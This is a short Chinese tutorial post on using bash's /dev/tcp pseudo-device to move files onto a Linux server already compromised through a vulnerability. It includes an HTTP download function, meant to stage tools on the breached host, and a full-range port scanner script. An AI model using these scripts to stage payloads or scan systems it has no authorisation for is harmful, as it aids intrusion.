当我们利用漏洞拿下linux服务器，会发现对方机器没有wget,curl等下载命令，如果使用ssh传文件，但是不知道对方机器密码，ftp传文件太麻烦了，有没有高效的传文件？

当然，那就是利用bash进行传输文件，

如果 host 是一个有效的主机名或 Internet 地址，而 port 是一个整数端口号或服务名称，Bash 会尝试打开相应的 TCP/UDP 套接字。

由于/dev/下的伪设备，可以这样做。它们是/dev/tcp和/dev/udp。

此功能/伪设备的结构是：

/dev/PROTOCOL/HOST/PORT

例如：

/dev/tcp/google.com/443

/dev/udp/192.168.0.10/123

因此，基于此，您可以使用此 Bash 功能发送多次请求，从 HTTP 到 NTP。此外，如果需要，您可以取回结果。

默认情况下， Bash 启用了网络重定向功能。

例如从nist.gov获取时间

cat </dev/tcp/time.nist.gov/13

访问一个请求

exec 3<> /dev/tcp/www.ippages.com/80echo -e "GET /simple/?se=1 HTTP/1.0\n" >&3cat <&3

我们把这些脚本整理成下载脚本。

function __get() {  read proto server path <<<$(echo ${1//// })  DOC=/${path// //}  HOST=${server//:*}  PORT=${server//*:}  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80  exec 3<>/dev/tcp/${HOST}/$PORT  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3  (while read line; do   [[ "$line" == $'\r' ]] && break  done && cat) <&3  exec 3>&-}

扫描端口脚本

#!/bin/bash
host=$1port_first=1port_last=65535for ((port=$port_first; port<=$port_last; port++))do  $(echo >/dev/tcp/$host/$port) >/dev/null 2>&1 && echo "$port open"done
